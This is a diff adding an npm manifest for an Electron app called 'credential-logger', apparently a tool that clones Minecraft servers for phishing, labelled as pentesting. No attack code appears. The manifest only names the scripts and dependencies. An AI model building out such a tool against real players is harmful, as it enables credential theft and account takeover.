@@ -1,0 +1,29 @@
+{
+  "name": "credential-logger",
+  "version": "1.0.0",
+  "description": "CREDENTIAL LOGGER - Interfaccia moderna per clonare server Minecraft",
+  "main": "main.js",
+  "scripts": {
+    "start": "electron .",
+    "dev": "electron . --dev",
+    "build": "electron-builder",
+    "console": "node minecraft-cloner.js"
+  },
+  "dependencies": {
+    "axios": "^1.12.2",
+    "minecraft-protocol": "^1.44.0"
+  },
+  "devDependencies": {
+    "electron": "^27.0.0"
+  },
+  "keywords": [
+    "minecraft",
+    "cloner",
+    "phishing",
+    "pentesting",
+    "electron",
+    "gui"
+  ],
+  "author": "MC Pentester",
+  "license": "MIT"
+}
